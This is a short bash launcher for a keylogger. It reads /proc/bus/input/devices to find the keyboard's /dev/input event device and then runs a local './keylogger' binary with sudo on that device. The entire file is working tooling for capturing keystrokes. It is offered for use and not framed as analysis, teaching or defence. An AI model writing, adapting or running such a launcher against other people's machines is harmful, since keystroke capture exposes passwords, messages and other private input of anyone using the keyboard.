#!/bin/bash

found_keyboard=false
keyboard_device="/dev/input/"

while read -r line
do
    if [[ $line == *"keyboard"* ]]; then
        found_keyboard=true
    fi

    if [ "$found_keyboard" = true ]; then
        if [[ $line == *"event"*[0-9] ]]; then
            keyboard_device+="$(echo $line | awk '{print $NF}')"
            break
        fi
    fi
done < "/proc/bus/input/devices"

echo "$keyboard_device"
sudo ./keylogger "$keyboard_device"
